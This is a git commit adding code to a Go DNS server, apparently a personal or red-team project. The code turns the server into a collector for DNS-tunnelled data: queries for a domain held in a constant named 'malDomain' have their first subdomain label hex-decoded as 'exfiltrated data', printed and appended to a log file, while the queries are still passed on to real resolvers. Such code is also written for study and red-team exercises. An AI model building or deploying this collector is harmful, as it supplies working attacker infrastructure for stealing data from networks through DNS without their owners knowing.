96140a1e01339033835e68c9f5029585c94de783
Emma Gubucz <k4m33k4z3@protonmail.com>
2025-02-11 20:07:43 +0100

    hex decode exfiltrated data

--- main.go
+++ main.go
@@ -1,12 +1,20 @@
 package main
 
 import (
+	"encoding/hex"
 	"fmt"
+	"os"
+	"strings"
 
 	"github.com/miekg/dns"
 )
 
 type dnsHandler struct{}
+
+const (
+	malDomain   string = "example.com"
+	logFileName string = "dns_exfiltrate.log"
+)
 
 func resolve(domain string, qtype uint16) *dns.Msg {
 	msg := new(dns.Msg)
@@ -22,6 +30,30 @@ func resolve(domain string, qtype uint16) *dns.Msg {
 	return in
 }
 
+func hexDecode(subdomain string) {
+	data := make([]byte, hex.DecodedLen(len(subdomain)))
+	_, err := hex.Decode(data, []byte(subdomain))
+	if err != nil {
+		return
+	} else {
+		fmt.Println("data:", string(data))
+		writeToFile(data)
+	}
+
+}
+
+func writeToFile(data []byte) {
+	f, err := os.OpenFile(logFileName, os.O_APPEND|os.O_WRONLY|os.O_CREATE, 0600)
+	if err != nil {
+		panic(err)
+	}
+	defer f.Close()
+	if _, err = f.Write(data); err != nil {
+		panic(err)
+	}
+
+}
+
 func (h *dnsHandler) ServeDNS(w dns.ResponseWriter, r *dns.Msg) {
 	msg := new(dns.Msg)
 	msg.SetReply(r)
@@ -29,6 +61,12 @@ func (h *dnsHandler) ServeDNS(w dns.ResponseWriter, r *dns.Msg) {
 
 	for _, question := range r.Question {
 		fmt.Printf("Received query: %s\n", question.Name)
+		// get subdomain to exfiltrate data
+		d := strings.Split(question.Name, ".")
+		domain := d[len(d)-3] + "." + d[len(d)-2]
+		if domain == malDomain {
+			hexDecode(d[0])
+		}
 		id := msg.Id // set original ID
 		// resolve real domains
 		msg = resolve(question.Name, question.Qtype)
